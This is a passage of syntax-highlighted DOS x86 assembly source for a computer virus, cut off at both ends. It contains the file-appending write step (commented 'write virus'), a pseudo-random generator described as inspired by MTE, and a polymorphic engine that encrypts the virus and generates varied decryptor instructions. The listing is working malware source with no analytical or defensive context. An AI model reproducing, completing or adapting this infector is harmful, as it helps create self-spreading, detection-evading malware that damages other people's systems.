&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;length of decryptor+encrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4202h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;goto end</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cwd</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encryptor + encrypted code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;length of decryptor+enc code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;write virus</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;restore registers</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- SUBROUTINES FOR ENCRYPION GENERATOR ------------------</span><br />
<span style="color: black; font-style: italic;">;--- Pseudo random number generator (inspired by MTE) -----</span><br />
<br />
Initialize_RNG<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;initialize generator</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;needed to emulate Random_Number</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get number of clock ticks</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">1Ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;since midnight in CX:DX</span><br />
<br />
Alter_RNG<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>rnd_ax<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>rnd_dx<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">AX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Random_Number<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculate a random number</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1234h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;will be: mov ax,xxxx</span><br />
rnd_ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5678h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and mov dx,xxxx</span><br />
rnd_dx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
<br />
Create_RN<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rcl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jns</span> &nbsp; &nbsp; short Random_Loop<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><br />
<br />
Random_Loop<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; Create_RN<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Alter_RNG<br />
<br />
<span style="color: black; font-style: italic;">;--- encrypt the virus with new encryption engine ---------</span><br />
<br />
Do_Encryption<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>ADD_Val<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Encrypt_SUB<br />
<br />
Encrypt_XOR<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Encrypt_SUB<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Encrypt_ADD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Encrypt_ADD<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- generate mov reg,xxxx --------------------------------</span><br />
<br />
Generate_MOV<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span>mov_register<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BX?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short Is_It_Ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; add_ind<br />
<br />
Is_It_Ax<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ch</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;A*?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Not_Ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;A* or D*?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Not_Ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
<br />
Not_Ax<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Which_MOV &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert the MOV</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;A*?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Is_It_Bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Val<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short CH_Or_CL<br />
<br />
Is_It_Bx<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;B*?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Is_It_Cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>ByteFill<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Not_BH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
<br />
Not_BH<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short CH_Or_CL<br />
<br />
Is_It_Cx<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;C*</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;byte or word encryption?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short CH_Or_CL<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;only half the number of bytes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
<br />
CH_Or_CL<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;byte or word register?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Word_Reg<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;*H?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Byte_Reg<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
<br />
Byte_Reg<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Word_Reg<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- insert MOV or alternative for MOV --------------------</span><br />
<br />
Which_MOV<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
